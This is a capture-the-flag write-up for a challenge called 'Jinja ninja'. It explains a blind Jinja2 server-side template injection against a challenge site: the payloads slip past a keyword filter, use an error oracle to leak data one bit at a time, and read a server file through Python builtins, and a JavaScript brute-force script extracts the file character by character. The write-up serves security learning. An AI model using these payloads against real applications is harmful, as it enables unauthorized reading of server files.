# Jinja ninja

- Road to Valhalla part 2
- hard

In part 1 of Road to Valhalla, you managed to capture another drawing, with a note on it.

> If you seek to find Valhalla, visit this website, and buy your ticket now: https://jinja-ninja.secchallenge.crysys.hu

As you check the website, it feels a bit fishy. As a citizen of the wastes, you feel it as your duty to check if the travel agency is valid. Find a way to access files on the server you might find coordinates of Valhalla.

https://jinja-ninja.secchallenge.crysys.hu

_author: Pepe_

## Notes
{% raw %}
<del>**I could not solve this challenge**</del>

`Jinja` instantly triggers me to think about SSTI and Flask. Sadly, I could not find *ANY* reflection on the webpage we are given, it just returned the same page no matter what I've sent to it.

(Just solved it after writing those lines above)

Basically, we don't have a reflection, so we can't simply confirm if we have a SSTI, but the name is a strong hint to that.

For most form data, you get `Sorry site under construction booking is not available.` as a response.

I've tried injecting `{{5*5}}` as any parameter, and I've got `The WAF catched that one.` - so some part of that is filtered, and it turns out that `{{` and `flag` are forbidden in the input.

After googling `flask blind ssti` I've found [this page](https://gist.github.com/camas/d11da038562e6e4547e9f5669d2f6cfe), witch details a method of bypassing the `{{` filter.

That page's method kinda works here, but we still don't get anything back. I've tried `{% for i in range(5/0) %}1{% endfor %}` and got `Something went wrong, try again later!` - so we can leak one bit of information at a time.

I was not sure where can the flag be, my initial guess was the `config` oject. `{% for i in range(5 if config else 5/0) %}1{% endfor %}` confirmed it exits, but it had only one key (`{% for i in range(5 if [config.keys()][1] else 5/0) %}1{% endfor %}`), and that was `ENV` (`{% for i in range(5 if config["ENV"]=="production" else 5/0) %}1{% endfor %}`).

From the same gist I've learned that I can get access to some of the globals, so I've tried opening the file `flag`. Bypassing the filtering for `flag` was trivial: `{% for i in range(5 if get_flashed_messages.__globals__.__builtins__.open("FLAG".lower()) else 5/0) %}1{% endfor %}`

So we can just open the file! Let's check the first character: `{% for i in range(5 if get_flashed_messages.__globals__.__builtins__.open("FLAG".lower()).read()[0]=="c" else 5/0) %}1{% endfor %}` - `c` as we expected from the flag format.

I've took some time to get it's length by binary-searching from 500, and found it's 145. After that, I've wrote a script to use the previous tactic to get the full flag.

Sadly, my script (written in python) did not work for some reason, so I re-wrote it in JS and copy-pasted it in the console:

```js
const printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c";

async function solve(length = 145) {
    let FLAG = "";
    while (FLAG.length < length) {
        for (let c of printable) {
            let formData = new FormData();
            const payload = `{% for i in range(5 if get_flashed_messages.__globals__.__builtins__.open("FLAG".lower()).read()[${FLAG.length}]=="${c}" else 5/0) %}1{% endfor %}`;
            //console.log(payload);
            formData.append('name', payload);
            formData.append('email', '');
            formData.append('faction', '');
            formData.append('profession', '');
            formData.append('preferences', '');
            
            const resp = await fetch("submit",{body: formData,method: "post"})
            const text = await resp.text();
            if (text.includes("Sorry site under construction")) {
                FLAG = FLAG + c;
                console.log(FLAG);
                break;
            }
        }       
    }
}
```
{% endraw %}
And that just got me the flag...